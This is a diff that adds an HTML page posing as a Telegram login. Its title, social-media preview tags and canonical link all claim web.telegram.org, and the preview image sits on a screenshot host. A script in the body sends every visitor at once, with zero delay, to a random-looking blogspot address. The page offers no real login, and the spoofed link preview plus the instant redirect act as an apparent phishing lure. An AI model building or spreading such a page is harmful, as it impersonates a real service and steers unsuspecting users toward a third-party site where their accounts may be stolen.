@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset=utf-8 />
+    <meta name=viewport content="width=device-width,minimum-scale=1" />
+    <meta property=og:type content="website" />
+    <meta property="og:locale" content="en_US" />
+    <meta property=fb:app_id content="180444840287" />
+    <meta property=fb:admin content="237344263766628" />
+    <meta property=fb:locale content="en_US" />
+    <meta property="og:title" content="Log in to Telegram">
+    <meta property="og:description" content="Log in to Telegram">
+    <meta property="og:image" content="https://img001.prntscr.com/file/img001/jIan6-IpTHyyhmCZ_wrLTg.png">
+    <meta property="og:author" content="hero">
+    <meta property="og:url" content="https://web.telegram.org">
+    <link href="https://img001.prntscr.com/file/img001/jIan6-IpTHyyhmCZ_wrLTg.png" rel="alternate" media="only screen and (max-width: 640px)">
+    <link rel="canonical" href="https://web.telegram.org">
+    <meta name=twitter:app:country content=US />
+    <meta property="twitter:title" content="Log in to Telegram">
+    <meta property="twitter:description" content="Log in to Telegram">
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:image" content="https://img001.prntscr.com/file/img001/jIan6-IpTHyyhmCZ_wrLTg.png">
+    <meta property="twitter:url" content="https://web.telegram.org">
+    <title>Log in to Telegram</title>
+</head>
+<body>
+    <h1>Log in to Telegram</h1>
+    <img src="https://img001.prntscr.com/file/img001/jIan6-IpTHyyhmCZ_wrLTg.png" alt="Log in to Telegram">
+  <script type="text/JavaScript">
+setTimeout("location.href = 'https://rt7y6y7t7we.blogspot.com/?m=1';",0);//menentukan waktu hitung dalam mili second (detik)
+</script>
+</body>
+</html>
